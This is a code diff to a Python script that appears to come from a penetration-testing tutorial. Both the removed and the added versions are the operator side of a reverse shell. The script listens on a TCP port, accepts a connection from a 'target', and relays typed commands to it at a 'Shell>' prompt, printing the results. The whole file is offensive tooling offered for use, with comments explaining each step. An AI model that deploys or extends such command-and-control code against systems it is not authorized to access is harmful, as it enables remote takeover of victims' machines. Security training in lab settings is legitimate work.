@@ -1,36 +1,35 @@
-import socket
-import threading
-import os
+import socket # For Building TCP Connection
 
-def send_commands(conn):
+def connect():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
+
+    s.bind(("10.0.2.15", 8080)) # define the IP and the listening port
+
+    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
+                                                            # target we will listen to one connection
+
+    print '[+] Listening for incoming TCP connection on port 8080'
+
+    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
+                                # port in a tuple format (IP,port)
+
+    print '[+] We got a connection from: ', addr
+
+
     while True:
-        cmd = input()
-        if cmd == 'quit':
+
+        command = raw_input("Shell> ") # Get user input and store it in command variable
+
+        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
+            conn.send('terminate')
             conn.close()
-            server.close()
-            sys.exit()
+            break
 
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response)
+        else:
+            conn.send(command) # Otherwise we will send the command to the target
+            print conn.recv(1024) # and print the result that we got back
 
-bind_ip = ""
-bind_port = 99
-
-serv_add = (bind_ip, bind_port)
-
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-server.bind((serv_add))
-server.listen(5)
-
-print ("[*] listening on {}:{}".format(bind_ip,bind_port))
-
-conn, addr = server.accept()
-print('accepted connection from {} and port {}'.format(addr[0],addr[1]))
-print("enter the commands below")
-
-send_commands(conn)
-
-conn.close()
+def main ():
+    connect()
+main()
